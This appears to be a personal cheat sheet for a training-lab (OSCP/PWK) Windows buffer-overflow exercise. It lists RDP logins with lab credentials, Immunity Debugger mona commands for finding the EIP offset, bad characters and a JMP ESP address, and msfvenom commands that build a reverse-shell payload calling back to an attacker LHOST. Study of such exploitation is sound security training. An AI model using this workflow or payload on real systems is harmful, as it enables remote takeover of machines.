```
xfreerdp /u:admin /p:lab /cert:ignore /v:192.168.29.111 /workarea  
rdesktop -a 16 -z -u admin -p lab 192.168.29.111
```

```
!mona config -set workingfolder c:\mona\%p
C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands\mona.py
192.168.29.86
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1400
!mona findmsp -distance 1400
EIP: 1377
#Update EIP to all scripts

!mona bytearray -b "\x00"

1. Send data with NULL
2. Take ESP OUT and put into COMPARE. 

## Don't forget extending the windows to right on BadChars. 
!mona compare -f C:\mona\offsec_pwk_srv\bytearray.bin -a 0035F454
# !mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 000000

#python bytearray.py
# Send updated Removed Bad Char buffer to target
!mona compare -f C:\mona\offsec_pwk_srv\bytearray.bin  "\x00\x04\x32\x78\x91\xc1"

# Update Offset on Python
"\\x00\\x8c\\xae\\xbe\\xfb"
"\x00\\x04\\x32\\x78\\x91\\xc1"

# Verify with new ESP on Immunity Debugger

!mona jmp -r esp -cpb "\x00\x04\x32\x78\x91\xc1"
!mona bytearray -b "\x00"

JMP ESP: "\x83\x66\x52\x56"

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.29 LPORT=4444 EXITFUNC=thread -b "\x00\x04\x32\x78\x91\xc1" -f py

!mona config -set workingfolder c:\mona\%p

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
!mona findmsp -distance 600!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
!mona jmp -r esp -cpb "\x00"
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
!mona config -set workingfolder c:\mona\%p
```
![image](https://user-images.githubusercontent.com/9059079/119589298-85138c80-bda0-11eb-825d-862e4f241a10.png)

![image](https://user-images.githubusercontent.com/9059079/119571250-1d991500-bd7f-11eb-9cb0-ca9bd73dc2f7.png)
